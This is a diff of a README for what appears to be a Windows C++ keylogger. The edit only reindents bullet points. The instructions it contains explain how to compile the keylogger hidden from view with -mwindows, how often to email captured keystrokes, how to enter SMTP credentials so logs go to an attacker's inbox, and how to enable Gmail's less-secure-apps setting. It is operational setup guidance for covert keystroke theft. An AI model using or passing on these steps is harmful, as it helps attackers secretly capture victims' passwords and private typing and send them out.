@@ -12,8 +12,8 @@ The Keylogger is able to capture all the keystrokes using system hooks. In addit
 * To compile it you need to enable C++11 standards and -mwindows flag
 * In KeyHook.h modify the variable sendIntervalInMinutes to be however many minutes you want in between each email.
 * Change the SMTP credentials wtihin SendMail.h to wherever you want to recieve the emails
-** X_EM_TO
-** X_EM_FROM
-** X_EM_PASS
-*** In addition - ensure that you enable "Allow Less Secure Apps" on gmail for the accoutn
-**** https://devanswers.co/allow-less-secure-apps-access-gmail-account/
+  * X_EM_TO
+  * X_EM_FROM
+  * X_EM_PASS
+ * In addition - ensure that you enable "Allow Less Secure Apps" on gmail for the accoutn
+ * https://devanswers.co/allow-less-secure-apps-access-gmail-account/
